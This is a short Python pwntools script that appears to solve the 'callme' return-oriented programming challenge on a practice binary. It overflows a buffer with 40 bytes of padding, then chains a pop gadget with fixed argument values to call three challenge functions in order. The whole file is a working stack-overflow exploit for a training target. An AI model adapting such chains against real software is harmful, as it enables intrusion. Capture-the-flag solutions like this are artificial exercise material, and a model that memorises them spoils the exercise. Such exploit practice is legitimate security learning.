from pwn import *

challenge = process("./callme")
#challenge = gdb.debug('./callme', """
#break _start
#continue
#break 0x40093c
#continue
#reg
#ni
#reg
#ni
#reg
#ni
#reg
#""")

for i in range(0, 5):
	print(challenge.recvline())

argumentPopGadget = "\x3c\x09\x40"+5*"\x00"

deadbeef = "\xef\xbe\xad\xde"
cafebabe = "\xbe\xba\xfe\xca"
doodfood = "\x0d\xf0\x0d\xd0"
triplegadget = 2*deadbeef+2*cafebabe+2*doodfood 

callmeone = "\x20\x07\x40" + 5*"\x00"
callmetwo = "\x40\x07\x40" + 5*"\x00"
callmethree = "\xf0\x06\x40" + 5*"\x00"

challenge.sendline(r"A"*40+argumentPopGadget+triplegadget+callmeone+argumentPopGadget+triplegadget+callmetwo+argumentPopGadget+triplegadget+callmethree)

for i in range(0, 10):
	print(challenge.recvline())
